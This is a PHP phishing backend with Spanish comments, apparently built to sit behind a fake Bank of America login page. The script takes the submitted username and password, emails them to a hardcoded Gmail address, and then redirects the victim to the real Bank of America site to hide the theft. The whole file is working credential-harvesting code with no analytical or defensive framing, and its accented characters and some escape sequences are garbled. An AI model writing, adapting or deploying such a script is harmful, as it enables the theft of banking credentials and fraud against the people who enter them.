<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $usuario = htmlspecialchars($_POST['username']);
    $contrase�a = htmlspecialchars($_POST['password']);

    // Configuraci�n del correo
    $to = "unico100k100k@gmail.com";
    $subject = "Nuevo inicio de sesi�n";
    $message = "Usuario: $usuarionContrase�a: $contrase�a";
    $headers = "From: no-reply@tudominio.com" . "rn" . 
               "Reply-To: no-reply@tudominio.com";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redireccionar a la p�gina de inicio de sesi�n de Bank of America
        header("Location: https://www.bankofamerica.com/");
        exit(); // Aseg�rate de salir despu�s de redirigir
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "M�todo de solicitud no v�lido.";
}
?>